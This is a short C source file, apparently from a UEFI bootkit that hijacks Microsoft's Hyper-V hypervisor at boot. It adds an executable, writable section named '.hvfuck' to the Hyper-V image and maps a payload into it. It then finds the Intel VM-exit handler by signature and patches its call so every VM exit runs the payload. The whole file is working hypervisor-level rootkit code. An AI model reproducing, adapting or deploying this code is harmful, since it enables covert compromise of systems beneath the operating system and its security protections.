#include "Hv.h"
#include "EUtils.h"
#include "Winload.h"



VOID MapHypervImage(VOID* HvImageBase,UINT32 HvImageSize)
{
	EFI_IMAGE_NT_HEADERS64* PyloadHeader = GetPeFileHeader(&g_MapperContext.hvPayloadData[0]);
	if (PyloadHeader == NULL)
	{
		return;
	}


	void* newSectionAddr = AddSection(HvImageBase, ".hvfuck", PyloadHeader->OptionalHeader.SizeOfImage, SECTION_RWX);
	MapPeSection(&g_MapperContext.hvPayloadData[0], newSectionAddr);


	HvContext hv = { 0 };
	hv.HypervModuleBase = (UINT64)HvImageBase;
	hv.HypervModuleSize = HvImageSize;
	hv.ModuleBase = (UINT64)newSectionAddr;
	hv.ModuleSize = PyloadHeader->OptionalHeader.SizeOfImage;


	VOID* VmExitHandler = FindPattern(HvImageBase,HvImageSize,INTEL_VMEXIT_HANDLER_SIG,INTEL_VMEXIT_HANDLER_MASK);

	if (VmExitHandler)
	{

#if WINVER == 2302
		UINT64 VmExitHandlerCall = ((UINT64)VmExitHandler) + 7; // + 7 bytes to -> call vmexit_c_handler
#endif

		UINT64 VmExitHandlerCallRip = (UINT64)VmExitHandlerCall + 5; // + 5 bytes because "call vmexit_c_handler" is 5 bytes
		UINT64 VmExitFunction = VmExitHandlerCallRip + *(INT32*)((UINT64)(VmExitHandlerCall + 1)); // + 1 to skip E8 (call) and read 4 bytes (RVA)
		hv.VmExitHandlerRva = ((UINT64)newSectionAddr + GetPeFileHeader(newSectionAddr)->OptionalHeader.AddressOfEntryPoint) - VmExitFunction;
		UINT32 NewVmExitRVA = ((UINT64)newSectionAddr + GetPeFileHeader(newSectionAddr)->OptionalHeader.AddressOfEntryPoint) - VmExitHandlerCallRip;

		FixRelocImage(newSectionAddr);
		VOID* contextPtr = GetExportByIndex(newSectionAddr, 0);
		MemCopy(contextPtr, &hv, sizeof(HvContext));
 

		*(INT32*)((UINT64)(VmExitHandlerCall + 1)) = NewVmExitRVA;
	}

}


